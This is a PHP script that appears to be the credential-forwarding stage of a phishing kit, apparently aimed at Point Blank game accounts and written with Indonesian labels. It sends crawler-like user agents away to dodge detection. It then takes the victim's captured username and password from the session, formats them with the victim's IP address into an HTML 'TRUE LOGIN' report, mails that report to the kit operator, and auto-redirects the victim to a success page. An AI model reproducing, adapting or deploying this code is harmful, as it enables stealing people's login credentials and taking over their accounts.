<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://www.facebook.com/IdhamDotID');
die();
}
 
error_reporting(0);
ob_start();
session_start();

if(!isset($_SESSION['username']) && !isset($_SESSION['katasandi'])){

	header("location:./");
	exit();
}

@unlink(getcwd() . "./jembut-lu-tipis.txt");

$email = $_SESSION['username'];
$password = $_SESSION['katasandi'];
$ip = $_SERVER['REMOTE_ADDR'];
include"email.php";
$body = <<<EOD
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8' />
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <style>
        img{width:90%;display:block;margin:20px auto;}
        .tbl-result{width:90%;margin:auto;border:1px solid #000;border-collapse:collapse;}
        .tbl-result th{border:1px solid #000;border-collapse:collapse;padding:8px;background:rgb(54, 54, 54);color:#fff;}
        .tbl-result td{border:1px solid #000;border-collapse:collapse;padding:8px;}
    </style>
</head>
<body> 
    <img src='https://image.ibb.co/mLF2Hz/logoresult.png'>
    <table class='tbl-result' align='center'>
        <tr><th colspan='2'>RESULT PB TRUE LOGIN</th></tr>
        <tr><td>Username</td><td>$email</td></tr>
        <tr><td>Password</td><td>$password</td></tr>
        <tr><td>IP Result</td><td>$ip</td></tr>
        <tr><th colspan='2'>RESULT PB TRUE LOGIN</th></tr>
    </table>
    <img src='https://image.ibb.co/mLF2Hz/logoresult.png'>
</body>
</html>
EOD;
$subjek = 'PB '.$email.' MASUK';
$headers = "From: Idhaam69@tytyd.com\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek, $body, $headers);
if($success) {
    echo "<form id='idham' method='POST' action='sukses.php'>
        <input type='hidden' name='email' value='$email'>
    </form>
    <script type='text/javascript'>document.getElementById('idham').submit();</script>";
}

$random = rand(1000,5000);
?>